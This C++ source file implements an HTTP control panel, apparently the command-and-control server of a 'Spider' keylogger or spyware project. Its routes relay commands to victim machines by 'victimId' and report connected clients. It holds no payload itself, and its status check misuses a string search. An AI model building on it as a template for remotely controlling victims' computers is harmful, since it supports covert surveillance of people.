#include <chrono>
#include <thread>
#include "WebServer.h"
#include "Logger.hpp"
#include "WebServer.h"

namespace spider
{
  namespace http
  {

    WebServer::WebServer(
        server::CommandCenter const &cmdCenter, volatile bool const &running,
        std::uint16_t                                                 port,
        std::vector<std::unique_ptr<::spider::server::Client>> const &clients)
        : AControl(cmdCenter, running, clients), m_port(port), m_routes(),
          m_io_service(),
          m_acceptor(m_io_service, boost::asio::ip::tcp::endpoint(
                                       boost::asio::ip::tcp::v4(), m_port)),
          m_clients{}, m_running(running), m_clientCount(0)
    {
      nope::log::Log(Info) << "init WebServer";

      m_routes["/404"] = [&](std::uint32_t askId, std::uint32_t victimId) {
	nope::log::Log(Info) << "Someone is on 404";
	server::Event ev;
	ev.destId = victimId;
	ev.emitter = this;
	ev.askId = askId;
	ev.commandName = "404";
	ev.response.setResponse("404");
	m_responseQueue.push(ev);
      };

      m_routes["/"] = [&](std::uint32_t askId, std::uint32_t victimId) {
	nope::log::Log(Info) << "Someone requested commandsInfo";
	server::Event ev;
	ev.destId = victimId;
	ev.emitter = this;
	ev.askId = askId;
	ev.commandName = "commandInfo";
	ev.response.setResponse("CommandInfo");
	m_responseQueue.push(ev);
      };

      m_routes["/nb"] = [&](std::uint32_t askId, std::uint32_t victimId) {
	nope::log::Log(Info) << "Someone requested the number of client";
	server::Event ev;
	ev.destId = victimId;
	ev.emitter = this;
	ev.askId = askId;
	ev.commandName = "clientCount";
	ev.response.setResponse("ClientCount");
	m_responseQueue.push(ev);
      };

      for (auto const &cur : m_commands)
	{
	  m_routes["/" + cur.name] = [&](std::uint32_t askId,
	                                 std::uint32_t victimId) {
            if (victimId >= getNbClient())
            {
              nope::log::Log(Info) << "Request on client out of range !";
              server::Event ev;
              ev.destId = victimId;
              ev.emitter = this;
              ev.askId = askId;
              ev.commandName = "404";
              ev.response.setResponse("404");
              m_responseQueue.push(ev);
              return ;
            }
            std::string url("/" + cur.name);
            nope::log::Log(Info)
              << "route for: " << url << " requested on client " << victimId;

            server::Event ev;
            ev.destId = victimId;
            ev.emitter = this;
            ev.askId = askId;
            ev.commandName = cur.name;
            ev.response.setResponse(cur.name);
            sendToSpider(ev);
          };
        }
    }

    WebServer::~WebServer()
    {
    }

    bool WebServer::pollEvent(server::Event &ev)
    {
      return (AControl::pollEvent(ev));
    }

    void WebServer::sendEvent(server::Event &ev)
    {
      AControl::sendEvent(ev);
    }

    void WebServer::sendToSpider(server::Event &ev)
    {
      AControl::sendToSpider(ev);
    }

    void WebServer::run()
    {
      using namespace std::chrono_literals;

      m_acceptor.listen();
      acceptClient(m_acceptor, m_io_service, m_routes, m_clientCount,
          m_clients);
      nope::log::Log(Info) << "WebServer started on port: " << m_port << "."
        << std::endl;
      while (m_running)
      {
        m_io_service.poll_one();
        m_io_service.reset();
        checkResponse();

        // Prevent high cpu usage
        std::this_thread::sleep_for(1ms);
      }
    }

    void WebServer::checkResponse()
    {
      while (!m_responseQueue.empty())
      {
        server::Event ev = m_responseQueue.front();
        m_responseQueue.pop();
        std::stringstream res;
        std::string       code;
        if (ev.commandName == "commandInfo")
        {
          code = "HTTP/1.1 200 OK";
          res << "{\"commands\": [\n";
          for (auto const &cur : m_commands)
          {
            res << "{\n\"name\": \"" << cur.name << "\",\n";
            res << "\"description\": \"" << cur.description << "\",\n";
            res << "\"route\": \"/" << cur.name << "/id\"\n";
            res << "}";
            if (&cur != &m_commands.back())
            {
              res << ",\n";
            }
          }
          res << "]\n}\n\r\n";
        }
        else if (ev.commandName == "clientCount")
        {
          code = "HTTP/1.1 200 OK";
          res << "{\"nbClients\" : " << getNbClient() << "}\r\n";
        }
        else if (ev.commandName == "404")
        {
          code = "HTTP/1.1 404 NOT FOUND";
          res << "{\"error\" : 404}\r\n";
        }
        else
        {
          if (ev.response.getResponse().find("OK"))
          {
            code = "HTTP/1.1 200 OK";
          }
          else
          {
            code = "HTTP/1.1 500 Internal Server Error";
          }
          res << "{\"command\" : \"" << ev.commandName << "\",";
          res << " \"response\" : \"" << ev.response.getResponse()
            << "\"}";
        }
        std::stringstream ss;
        ss << code << std::endl;
        ss << "Access-Control-Allow-Origin: *" << std::endl;
        ss << "content-type: text/html" << std::endl;
        ss << "content-length: " << res.str().length() << std::endl;
        ss << std::endl;
        ss << res.str();
        ss << "\r\n";
        for (auto &client : m_clients)
        {
          if (ev.askId == client->getId())
          {
            std::shared_ptr<std::string> str =
              std::make_shared<std::string>(ss.str());
            boost::asio::async_write(
                client->getSocket(),
                boost::asio::buffer(str->c_str(), str->length()),
                [&client, str](boost::system::error_code const &e,
                  std::size_t n) {
                if (e)
                {
                nope::log::Log(Debug)
                << "erreur writting to AControl's client ["
                << n << "]";
                return;
                }
                });
            break;
          }
        }
      }
    }

    void WebServer::acceptClient(
        boost::asio::ip::tcp::acceptor &acceptor,
        boost::asio::io_service &       io_service,
        std::map<std::string,
        std::function<void(std::uint32_t, std::uint32_t)>> &routes,
        std::uint32_t &                                clientCount,
        std::vector<std::shared_ptr<HTTPUserSession>> &clients)
    {
      std::shared_ptr<HTTPUserSession> client =
        std::make_shared<HTTPUserSession>(io_service, routes, clientCount++);
      clients.push_back(client);
      acceptor.async_accept(
          client->getSocket(),
          [client, &acceptor, &io_service, &routes, &clientCount,
          &clients](const boost::system::error_code &e) {
          WebServer::acceptClient(acceptor, io_service, routes, clientCount,
              clients);
          if (!e)
          {
          client->sessionStart(client);
          }
          else
          {
          nope::log::Log(Error)
          << "cannot accept client on WebServer :/";
          }
          });
    }

    void WebServer::addRoute(
        std::string url, std::function<void(std::uint32_t, std::uint32_t)> x)
    {
      m_routes[url] = x;
    }
  }
}
